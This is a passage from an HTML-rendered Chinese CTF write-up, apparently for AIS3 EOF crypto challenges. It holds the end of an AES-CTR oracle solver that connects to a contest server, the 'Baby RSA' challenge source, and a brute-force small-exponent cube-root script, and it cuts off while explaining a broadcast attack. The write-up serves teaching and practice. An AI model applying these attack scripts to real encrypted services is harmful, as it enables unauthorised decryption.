AES_enc(encrypted_ctr[<span class="number">6</span>], ctr[<span class="number">2</span>])</span><br><span class="line">    c3_hi = xor(r3_hi, encrypted_ctr[<span class="number">2</span>])</span><br><span class="line">    flag_hi = xor(xor(c1_hi, c2_hi), c3_hi)</span><br><span class="line"></span><br><span class="line">    io.close()</span><br><span class="line">    <span class="comment"># Step2: get the second block of the flag (see ctf.goodnotes p22).</span></span><br><span class="line">    io = remote(<span class="string">'chal1.eof.ais3.org'</span>, <span class="number">10003</span>)</span><br><span class="line">    ctr0, r1, r2, r3 = do_init()</span><br><span class="line">    r1_lo, r1_hi = r1[<span class="number">16</span>:], r1[:<span class="number">16</span>]</span><br><span class="line">    r2_lo, r2_hi = r2[<span class="number">16</span>:], r2[:<span class="number">16</span>]</span><br><span class="line">    r3_lo, r3_hi = r3[<span class="number">16</span>:], r3[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.1: Get f(CTR3~CTR7) by abusing the CTR mode.</span></span><br><span class="line">    encrypted_ctr = [<span class="built_in">bytes</span>(<span class="number">16</span>), <span class="built_in">bytes</span>(<span class="number">16</span>), <span class="built_in">bytes</span>(<span class="number">16</span>)]</span><br><span class="line">    ctr = [ctr0]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>): ctr += [counter_add(ctr[-<span class="number">1</span>])]</span><br><span class="line">    m = <span class="built_in">bytes</span>(<span class="number">16</span>) * <span class="number">5</span></span><br><span class="line">    _, t = AES_CTR(m)</span><br><span class="line">    encrypted_ctr += [t[i:i+<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(t), <span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.2: Get c3_lo</span></span><br><span class="line">    c3_lo = xor(r3_lo, encrypted_ctr[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.3: Get c1_hi</span></span><br><span class="line">    encrypted_ctr[<span class="number">0</span>] = AES_enc(encrypted_ctr[<span class="number">4</span>], ctr0)</span><br><span class="line">    c1_hi = xor(r1_hi, encrypted_ctr[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.4: Get c1_lo</span></span><br><span class="line">    encrypted_r1_hi = AES_enc(encrypted_ctr[<span class="number">5</span>], r1_hi)</span><br><span class="line">    c1_lo = xor(r1_lo, encrypted_r1_hi)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.5: Get f(CTR1).</span></span><br><span class="line">    encrypted_ctr[<span class="number">1</span>] = AES_enc(encrypted_ctr[<span class="number">6</span>], ctr[<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># 2.5.2: Get f(f(CTR1)).</span></span><br><span class="line">    encrypted_encrypted_ctr1 = AES_enc(encrypted_ctr[<span class="number">7</span>], encrypted_ctr[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.6: Get c2_lo</span></span><br><span class="line">    c2_lo = xor(r2_lo, encrypted_encrypted_ctr1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f'c2_lo: <span class="subst">{c2_lo}</span>'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.7: Get flag_lo</span></span><br><span class="line">    flag_lo = xor(xor(c1_lo, c2_lo), c3_lo)</span><br><span class="line">    <span class="built_in">print</span>(flag_hi + flag_lo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><h3 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby RSA"></a>Baby RSA</h3><h4 id="題目-1"><a href="#題目-1" class="headerlink" title="題目"></a>題目</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes, getPrime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, e, n</span>):</span><br><span class="line">    enc = <span class="built_in">pow</span>(bytes_to_long(m), e, n)</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c, d, n</span>):</span><br><span class="line">    dec = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(dec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(<span class="number">1024</span>)</span><br><span class="line">        q = getPrime(<span class="number">1024</span>)</span><br><span class="line">        n = p * q</span><br><span class="line">        phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">        e = <span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> phi % e != <span class="number">0</span> : </span><br><span class="line">            d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"<span class="subst">{n=}</span>, <span class="subst">{e=}</span>"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"FLAG: "</span>, encrypt(FLAG, e, n))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">"Any message for me?"</span>))</span><br><span class="line">            m = decrypt(c, d, n)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"How beautiful the message is, it makes me want to destroy it .w."</span>)</span><br><span class="line">            new_m = long_to_bytes(bytes_to_long(m) ^ bytes_to_long(os.urandom(<span class="number">8</span>)))</span><br><span class="line">            <span class="built_in">print</span>( <span class="string">"New Message: "</span>, encrypt(new_m, e, n) )</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"?"</span>)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure></div><h4 id="題解-1"><a href="#題解-1" class="headerlink" title="題解"></a>題解</h4><p>看到題目的 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.054ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 466 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g></g></svg></mjx-container> 只有 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="1.131ex" height="1.554ex" role="img" focusable="false" viewBox="0 -665 500 687"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g></g></svg></mjx-container> 想要直接爆爆看有沒有可以直接開三次方根的 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="13.353ex" height="2.009ex" role="img" focusable="false" viewBox="0 -694 5901.9 888"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(433,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(778,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mi" transform="translate(1281,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(1857,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(2323,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2996.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(3996.4,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mo" transform="translate(4579.7,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mi" transform="translate(5301.9,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>, 但題目有記得把 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.986ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 878 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container> 有 padding, 所以行不通, 附上 script.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line">n = <span class="number">18677933168008233862726486577615630655319899601079688523367573745599357704234954802606818193834340309017021320677505092036507176460474518323934167205811675647066354154003096437643854109757426215393592066709055528097663981374737741676075848125072975533078499675096215639292570270742596700082287038458911644658840064362092328187053039741690011255833915096067741900819952870995931030767145062100485555219579387507654507263015000954439171215725772023228903943537448091846694158281548182640944828147736677816417468469997270202646430776889002467958011398515921293723471619625369793121962920137825434330357333100968436901363</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">cipher = <span class="number">10747762371744113694915117977685831647243063426258867025246542454281413004395728404414997829085670181608688805695780144233171759525425915063492864356921417912617435994793798664951855523818662133187209620367456710600952496639238651569585369752857234291480253383212138775832709377163452540364024163787037218553815099859550383283482004814711037273293597074648733123770764270333138241737517359455992214762107750515080661954119778825619368396986417699290849012823448972411843095725133092773317468286178984744285290289523530305964999138569734106290992210589931329921740355337560474032356456348227285559430754173028152146829</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">j</span>):</span><br><span class="line">    a, b = gmpy2.iroot(cipher + j * n, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> b:</span><br><span class="line">        m = a</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        pool.terminate()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmallE</span>(<span class="params">pool, inputs</span>):</span><br><span class="line">    pool.<span class="built_in">map</span>(calc, inputs)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'start'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">1000</span>):</span><br><span class="line">        inputs = <span class="built_in">list</span>(<span class="built_in">range</span>(i*<span class="number">1300000000</span>, (i+<span class="number">1</span>)*<span class="number">1300000000</span>))</span><br><span class="line">        pool = Pool()</span><br><span class="line">        SmallE(pool, inputs)</span><br></pre></td></tr></table></figure></div><p>觀察到每次連線都會取得不同的 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.357ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 600 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>, 但 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="8.771ex" height="2.059ex" role="img" focusable="false" viewBox="0 -716 3876.7 910"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"></path></g><g data-mml-node="mi" transform="translate(749,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mi" transform="translate(1430,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(2180,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mo" transform="translate(2966,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(3410.7,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g></g></svg></mjx-container> 都是相同的, 所以可進行 broadcast attack.</p><p>進行三次連線取得 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="17.968ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 7941.7 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(633,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1036.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1481.2,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(633,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 